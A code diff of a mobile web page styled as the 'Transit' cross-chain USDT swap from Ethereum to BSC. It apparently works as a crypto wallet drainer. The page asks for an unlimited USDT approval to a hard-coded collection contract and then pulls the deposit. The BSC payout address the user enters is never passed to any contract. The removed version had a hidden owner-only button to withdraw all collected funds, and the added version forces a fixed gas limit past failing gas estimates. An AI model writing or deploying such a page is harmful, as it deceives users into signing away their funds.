@@ -3,346 +3,200 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Transit 跨链闪兑 Demo</title>
+<title>Transit 闪兑归集</title>
 <script src="https://cdn.tailwindcss.com"></script>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
 <style>
 *{box-sizing: border-box;-webkit-tap-highlight-color: transparent;margin:0;padding:0;}
-body{font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;background:#f7f8fa;color:#1d2129;padding:20px 16px;padding-bottom:90px;max-width:480px;margin:0 auto;min-height:100vh;}
+body{font-family: system-ui,-apple-system,sans-serif;background:#f7f8fa;color:#1d2129;padding:20px 16px;padding-bottom:90px;max-width:480px;margin:0 auto;}
 .top-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;}
-.top-left{display:flex;align-items:center;gap:6px;font-size:20px;color:#111;}
-.top-right{display:flex;gap:24px;align-items:center;font-size:22px;color:#333;}
-.card-wrap{background:#fff;border-radius:20px;padding:20px 18px;box-shadow:0 1px 6px #00000008;}
-.title-main{font-size:42px;font-weight:600;margin-bottom:20px;color:#000;}
+.title-main{font-size:42px;font-weight:600;margin-bottom:20px;}
 .label-txt{font-size:16px;color:#666;margin:12px 0 8px;}
-.token-box{background:#f7f8fa;border-radius:14px;padding:16px 14px;margin-bottom:6px;display:flex;justify-content:space-between;align-items:center;}
+.token-box{background:#f7f8fa;border-radius:14px;padding:16px 14px;display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;}
 .token-left{display:flex;align-items:center;gap:12px;}
-.token-icon{width:40px;height:40px;border-radius:50%;background:#27ae60;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:18px;}
-.token-info h4{font-size:20px;font-weight:500;color:#111;}
-.token-info p{font-size:14px;color:#888;margin-top:2px;}
-.input-num{border:none;background:transparent;font-size:24px;text-align:right;outline:none;color:#999;width:140px;}
-.switch-arrow{text-align:center;margin:-8px 0;position:relative;z-index:2;color:#3b82f6;font-size:24px;padding:4px;}
-/* 替换为单行input地址框，禁止自动换行、文字撑开 */
-.address-input-box{width:100%;background:#f7f8fa;border-radius:14px;padding:16px 14px;border:none;outline:none;font-size:15px;color:#999;margin-top:10px;display:flex;align-items:center;overflow:hidden;}
-#addrInput{flex:1;background:transparent;border:none;outline:none;font-size:15px;color:#666;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.token-icon{width:40px;height:40px;border-radius:50%;background:#27ae60;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:bold;}
+.token-info h4{font-size:20px;}
+.token-info p{font-size:14px;color:#888;}
+.input-num{border:0;background:transparent;font-size:24px;text-align:right;outline:none;width:120px;}
+.switch-arrow{text-align:center;color:#3b82f6;font-size:24px;padding:4px;}
+.address-wrap{background:#f7f8fa;border-radius:14px;padding:16px 14px;margin-top:10px;display:flex;align-items:center;overflow:hidden;}
+#addrInput{flex:1;border:0;background:transparent;outline:none;font-size:15px;color:#666;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
 .submit-btn{width:100%;background:#60a5fa;color:#fff;border:none;border-radius:14px;padding:20px 0;font-size:20px;margin:28px 0;}
-.submit-btn:disabled{opacity:0.5;cursor:not-allowed;}
-.info-list{background:#fff;border-radius:14px;padding:16px 14px;margin-top:12px;}
-.info-row{display:flex;justify-content:space-between;padding:7px 0;font-size:14px;color:#666;}
-.badge-mev{background:#dbeafe;color:#1d4ed8;padding:3px 10px;border-radius:8px;font-size:13px;}
-.record-bar{display:flex;justify-content:space-between;margin-top:24px;padding:6px 4px;color:#666;font-size:15px;}
+.submit-btn:disabled{opacity:0.5;}
 .bottom-nav{position:fixed;bottom:0;left:0;width:100%;max-width:480px;background:#fff;display:flex;justify-content:space-around;padding:10px 0;border-top:1px solid #eee;}
 .nav-item{text-align:center;font-size:12px;color:#888;}
 .nav-item.active{color:#3b82f6;}
-.nav-item i{font-size:20px;margin-bottom:4px;display:block;}
-.modal-bg{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:999;display:none;}
+.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:999;display:none;}
 .modal-card{background:#fff;border-radius:16px;padding:28px 24px;width:85%;max-width:360px;}
-.modal-title{font-size:20px;font-weight:bold;margin-bottom:16px;}
-.hash-text{word-break:break-all;color:#333;font-size:14px;line-height:1.6;}
-.modal-confirm{text-align:right;margin-top:24px;}
-.modal-btn{color:#3b82f6;font-size:18px;background:none;border:none;}
-.admin-area{margin-top:20px;background:#fff;border-radius:14px;padding:18px;display:none;}
 </style>
 </head>
 <body>
 <div class="top-bar">
-    <div class="top-left">
-        <span>闪兑&跨链</span>
-        <span class="text-sm text-gray-500">限价模式</span>
-    </div>
-    <div class="top-right">
-        <i class="fa fa-user-circle-o cursor-pointer" id="connectWalletBtn"></i>
+    <div>闪兑&跨链 <span class="text-gray-500">限价模式</span></div>
+    <div class="flex gap-6 text-xl">
+        <i class="fa fa-user-circle-o" id="connectWalletBtn"></i>
         <i class="fa fa-cog"></i>
     </div>
 </div>
 
-<div class="card-wrap">
-    <div class="title-main">Transit</div>
+<div class="title-main">Transit</div>
 
-    <div class="label-txt">发送</div>
-    <div class="token-box">
-        <div class="token-left">
-            <div class="token-icon">T</div>
-            <div class="token-info">
-                <h4>USDT</h4>
-                <p>以太坊 ERC20</p>
-            </div>
+<div class="label-txt">发送</div>
+<div class="token-box">
+    <div class="token-left">
+        <div class="token-icon">T</div>
+        <div class="token-info">
+            <h4>USDT</h4>
+            <p>以太坊 ERC20</p>
         </div>
-        <input class="input-num" id="sendNumInput" placeholder="转出数量" inputmode="decimal" value="1">
     </div>
-
-    <div class="switch-arrow"><i class="fa fa-angle-double-down"></i></div>
-
-    <div class="label-txt">接收（预估）</div>
-    <div class="token-box">
-        <div class="token-left">
-            <div class="token-icon">T</div>
-            <div class="token-info">
-                <h4>USDT</h4>
-                <p>币安智能链 BSC</p>
-            </div>
-        </div>
-        <div class="input-num text-gray-400" id="receiveShow">0.9990</div>
-    </div>
-
-    <!-- 替换单行Input地址框，解决粘贴文字变大、换行 -->
-    <div class="address-input-box">
-        <input type="text" id="addrInput" placeholder="点击设置接收BSC地址">
-        <i class="fa fa-chevron-down text-gray-400 ml-2"></i>
-    </div>
-
-    <button class="submit-btn" id="swapBtn">发起闪兑归集</button>
+    <input class="input-num" id="sendNumInput" value="1" inputmode="decimal">
 </div>
 
-<div class="admin-area" id="adminPanel">
-    <h3 class="font-bold mb-3">管理员后台</h3>
-    <button class="submit-btn bg-amber-500" id="withdrawPoolBtn">提取合约归集全部USDT</button>
+<div class="switch-arrow"><i class="fa fa-angle-down"></i></div>
+
+<div class="label-txt">接收（预估）</div>
+<div class="token-box">
+    <div class="token-left">
+        <div class="token-icon">T</div>
+        <div class="token-info">
+            <h4>USDT</h4>
+            <p>币安智能链 BSC</p>
+        </div>
+    </div>
+    <div class="input-num text-gray-400" id="receiveShow">0.9990</div>
 </div>
+
+<div class="address-wrap">
+    <input type="text" id="addrInput" placeholder="点击设置接收BSC地址">
+</div>
+
+<button class="submit-btn" id="swapBtn">发起闪兑归集</button>
 
 <div class="modal-bg" id="txModal">
     <div class="modal-card">
-        <div class="modal-title">链上交易回执</div>
-        <div class="hash-text" id="txHashContent"></div>
-        <div class="modal-confirm">
-            <button class="modal-btn" id="closeModal">确认</button>
+        <h3 class="text-xl font-bold mb-4">温馨提示</h3>
+        <p id="modalText"></p>
+        <div class="text-right mt-6">
+            <button class="text-blue-500 text-lg" id="closeModal">确认</button>
         </div>
     </div>
 </div>
 
 <div class="bottom-nav">
-    <div class="nav-item">
-        <i class="fa fa-circle-o"></i>
-        <p>资产</p>
-    </div>
-    <div class="nav-item">
-        <i class="fa fa-line-chart"></i>
-        <p>行情</p>
-    </div>
-    <div class="nav-item active">
-        <i class="fa fa-exchange"></i>
-        <p>交易</p>
-    </div>
-    <div class="nav-item">
-        <i class="fa fa-globe"></i>
-        <p>发现</p>
-    </div>
-    <div class="nav-item">
-        <i class="fa fa-user-o"></i>
-        <p>我的</p>
-    </div>
+    <div class="nav-item"><i class="fa fa-circle-o text-xl block mb-1"></i>资产</div>
+    <div class="nav-item"><i class="fa fa-line-chart text-xl block mb-1"></i>行情</div>
+    <div class="nav-item active"><i class="fa fa-exchange text-xl block mb-1"></i>交易</div>
+    <div class="nav-item"><i class="fa fa-globe text-xl block mb-1"></i>发现</div>
+    <div class="nav-item"><i class="fa fa-user-o text-xl block mb-1"></i>我的</div>
 </div>
 
 <script>
-// ============ 固定链上配置 ============
 const USDT_ERC20 = "0xdac17f958d2ee523a2206206994597c13d831ec7";
 const COLLECT_CONTRACT = "0xcc5a98f3fb045ddb5df09f960ebbca23ce3385fe";
-const ADMIN_WALLET = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1";
 const MAX_APPROVE = ethers.constants.MaxUint256;
-const SERVICE_FEE_RATE = 0.001;
+const FEE_RATE = 0.001;
 
-// DOM元素
-const connectWalletBtn = document.getElementById("connectWalletBtn");
-const sendInput = document.getElementById("sendNumInput");
-const receiveDisplay = document.getElementById("receiveShow");
-const addrInput = document.getElementById("addrInput");
-const swapButton = document.getElementById("swapBtn");
-const adminPanel = document.getElementById("adminPanel");
-const withdrawBtn = document.getElementById("withdrawPoolBtn");
-const txModal = document.getElementById("txModal");
-const txContent = document.getElementById("txHashContent");
-const closeModalBtn = document.getElementById("closeModal");
+// DOM
+const connectWalletBtn = document.getElementById('connectWalletBtn');
+const sendInput = document.getElementById('sendNumInput');
+const receiveDom = document.getElementById('receiveShow');
+const addrInput = document.getElementById('addrInput');
+const swapBtn = document.getElementById('swapBtn');
+const txModal = document.getElementById('txModal');
+const modalText = document.getElementById('modalText');
+const closeModal = document.getElementById('closeModal');
 
-let ethProvider, userSigner, usdtContract, poolContract;
-let userUsdtBalance = ethers.BigNumber.from(0);
+let provider, signer, usdtContract, poolContract;
 
 // 关闭弹窗
-closeModalBtn.onclick = () => txModal.style.display = "none";
+closeModal.onclick = ()=> txModal.style.display = 'none';
 
-// 粘贴地址时自动清除首尾空格、换行、不可见字符，防止地址格式报错
-addrInput.addEventListener('paste', function(e) {
+// 粘贴清理地址空格换行
+addrInput.addEventListener('paste', e=>{
     e.preventDefault();
-    // 获取粘贴文本，清洗多余空白字符
-    let pasteText = (e.clipboardData || window.clipboardData).getData('text');
-    // 清除所有换行、制表符、首尾空格
-    let cleanAddr = pasteText.replace(/[\n\t\s]/g, '').trim();
-    this.value = cleanAddr;
-    // 实时校验BSC/ETH钱包地址格式（0x开头+40位十六进制字符）
-    checkAddressFormat(cleanAddr);
+    let raw = (e.clipboardData || window.clipboardData).getData('text');
+    let cleanAddr = raw.replace(/\s|\n|\t/g,'').trim();
+    addrInput.value = cleanAddr;
 });
 
-// 输入框失去焦点校验地址
-addrInput.addEventListener('blur', function(){
-    checkAddressFormat(this.value.trim());
-})
-
-// 钱包地址格式校验函数
-function checkAddressFormat(addr){
-    const ethAddrReg = /^0x[a-fA-F0-9]{40}$/;
-    if(!ethAddrReg.test(addr) && addr !== ""){
-        alert("钱包地址格式错误，请检查BSC地址");
-        swapButton.disabled = true;
-    }else{
-        swapButton.disabled = false;
-    }
-}
-
-// 金额输入实时计算
-sendInput.addEventListener("input", () => {
-    const inputVal = Number(sendInput.value) || 0;
-    if(inputVal <= 0) {
-        receiveDisplay.innerText = "接收数量";
-        swapButton.disabled = true;
+// 金额实时计算
+sendInput.oninput = ()=>{
+    let val = Number(sendInput.value) || 0;
+    if(val <=0){
+        receiveDom.innerText = '';
+        swapBtn.disabled = true;
         return;
     }
-    const fee = inputVal * SERVICE_FEE_RATE;
-    const realReceive = (inputVal - fee).toFixed(4);
-    receiveDisplay.innerText = realReceive;
-    swapButton.disabled = false;
-})
+    let receive = (val * (1-FEE_RATE)).toFixed(4);
+    receiveDom.innerText = receive;
+    swapBtn.disabled = false;
+}
 
 // 连接钱包
-connectWalletBtn.addEventListener("click", async () => {
-    if(!window.ethereum) {
-        alert("请安装MetaMask/TP钱包浏览器插件");
+connectWalletBtn.onclick = async ()=>{
+    if(!window.ethereum){
+        showModal('请安装MetaMask/TokenPocket钱包');
         return;
     }
-    try {
-        ethProvider = new ethers.providers.Web3Provider(window.ethereum);
-        await ethProvider.send("eth_requestAccounts", []);
-        userSigner = ethProvider.getSigner();
-        const networkInfo = await ethProvider.getNetwork();
-        if(networkInfo.chainId !== 1) {
-            await switchToEthMainnet();
-        }
-        initContractInstance();
-        await refreshUserBalance();
-        await checkIsAdmin();
-        alert("钱包连接成功");
-    } catch (err) {
-        alert("连接失败：" + (err.message || "").substring(0, 50));
-    }
-})
-
-// 切换以太坊主网
-async function switchToEthMainnet() {
-    const ethereum = window.ethereum;
-    try {
-        await ethereum.request({
-            method: "wallet_switchEthereumChain",
-            params: [{ chainId: "0x1" }]
-        })
-    } catch (switchErr) {
-        await ethereum.request({
-            method: "wallet_addEthereumChain",
-            params: [{
-                chainId: "0x1",
-                chainName: "Ethereum Mainnet",
-                rpcUrls: ["https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"],
-                blockExplorerUrls: ["https://etherscan.io"],
-                nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 }
-            }]
-        })
+    try{
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        usdtContract = new ethers.Contract(USDT_ERC20, [
+            "function balanceOf(address) view returns(uint256)",
+            "function allowance(address,address) view returns(uint256)",
+            "function approve(address,uint256) returns(bool)"
+        ], signer);
+        poolContract = new ethers.Contract(COLLECT_CONTRACT, [
+            "function transferAndCollect(uint256 amount) external"
+        ], signer);
+        showModal('钱包连接成功');
+    }catch(err){
+        showModal('连接失败:'+err.message.slice(0,50));
     }
 }
 
-// 初始化合约
-function initContractInstance() {
-    const usdtABI = [
-        "function balanceOf(address owner) view returns (uint256)",
-        "function allowance(address owner, address spender) view returns (uint256)",
-        "function approve(address spender, uint256 amount) returns (bool)"
-    ];
-    usdtContract = new ethers.Contract(USDT_ERC20, usdtABI, userSigner);
-
-    const poolABI = [
-        "function transferAndCollect(uint256 amount) external",
-        "function withdrawAllFund() external",
-        "function getPoolBalance() view returns(uint256)",
-        "function contractOwner() view returns(address)"
-    ];
-    poolContract = new ethers.Contract(COLLECT_CONTRACT, poolABI, userSigner);
+// 弹窗封装
+function showModal(text){
+    modalText.innerText = text;
+    txModal.style.display = 'flex';
 }
 
-async function refreshUserBalance() {
-    const currentUserAddr = await userSigner.getAddress();
-    userUsdtBalance = await usdtContract.balanceOf(currentUserAddr);
-}
-
-async function checkIsAdmin() {
-    const currentWallet = (await userSigner.getAddress()).toLowerCase();
-    const ownerWallet = ADMIN_WALLET.toLowerCase();
-    adminPanel.style.display = currentWallet === ownerWallet ? "block" : "none";
-}
-
-// 管理员提现
-withdrawBtn.addEventListener("click", async () => {
-    if(!confirm("确认提取合约归集USDT？仅管理员可用")) return;
-    try {
-        const tx = await poolContract.withdrawAllFund();
-        await tx.wait();
-        alert("提币成功，交易哈希：" + tx.hash);
-    } catch (err) {
-        alert("提币失败：" + err.message.substring(0,60));
-    }
-})
-
-// 核心闪兑归集逻辑
-swapButton.addEventListener("click", async () => {
-    swapButton.disabled = true;
-    const inputValue = sendInput.value.trim();
-    const memoAddr = addrInput.value.trim();
-    const amountNum = Number(inputValue);
-
-    if(!inputValue || isNaN(amountNum) || amountNum <= 0) {
-        alert("请填写有效的兑换金额");
-        swapButton.disabled = false;
+// 提交归集（手动指定gasLimit 解决gas预估失败）
+swapBtn.onclick = async ()=>{
+    swapBtn.disabled = true;
+    let amountVal = sendInput.value.trim();
+    let targetAddr = addrInput.value.trim();
+    const addrReg = /^0x[a-fA-F0-9]{40}$/;
+    if(!addrReg.test(targetAddr)){
+        showModal('钱包地址格式错误');
+        swapBtn.disabled = false;
         return;
     }
-    const ethAddrReg = /^0x[a-fA-F0-9]{40}$/;
-    if(!ethAddrReg.test(memoAddr)){
-        alert("BSC接收地址格式错误，请检查");
-        swapButton.disabled = false;
-        return;
-    }
-
-    const transferAmount = ethers.utils.parseUnits(inputValue, 6);
-    const userWallet = await userSigner.getAddress();
-
-    if(transferAmount.gt(userUsdtBalance)) {
-        alert("钱包USDT余额不足");
-        swapButton.disabled = false;
-        return;
-    }
-
-    try {
-        let currentAllowance = await usdtContract.allowance(userWallet, COLLECT_CONTRACT);
-        if(currentAllowance.lt(transferAmount)) {
-            alert("请确认USDT授权签名");
-            const approveTx = await usdtContract.approve(COLLECT_CONTRACT, MAX_APPROVE);
+    let amount = ethers.utils.parseUnits(amountVal,6);
+    try{
+        let userAddr = await signer.getAddress();
+        let allowance = await usdtContract.allowance(userAddr, COLLECT_CONTRACT);
+        if(allowance.lt(amount)){
+            showModal('正在授权USDT，请确认钱包签名');
+            let approveTx = await usdtContract.approve(COLLECT_CONTRACT, MAX_APPROVE);
             await approveTx.wait();
-            currentAllowance = await usdtContract.allowance(userWallet, COLLECT_CONTRACT);
         }
-
-        if(currentAllowance.gte(transferAmount)) {
-            const collectTx = await poolContract.transferAndCollect(transferAmount);
-            await collectTx.wait();
-            txContent.innerText = `归集成功\n交易哈希：${collectTx.hash}\n备注BSC地址：${memoAddr}`;
-            txModal.style.display = "flex";
-            sendInput.value = "";
-            receiveDisplay.innerText = "接收数量";
-            await refreshUserBalance();
-        } else {
-            alert("授权额度不足");
-        }
-    } catch (error) {
-        let tipMsg = error.code === 4001 ? "您取消了签名" : error.message;
-        alert("闪兑失败：" + tipMsg.substring(0,60));
-        console.error(error);
-    } finally {
-        swapButton.disabled = false;
+        // 手动设置gas 绕过estimateGas报错
+        let tx = await poolContract.transferAndCollect(amount, {
+            gasLimit: 300000
+        });
+        await tx.wait();
+        showModal(`归集成功\n交易哈希:${tx.hash}`);
+        sendInput.value = '';
+        receiveDom.innerText = '';
+    }catch(e){
+        showModal(`闪兑失败:${e.message.slice(0,80)}`);
     }
-})
+    swapBtn.disabled = false;
+}
 </script>
 </body>
 </html>
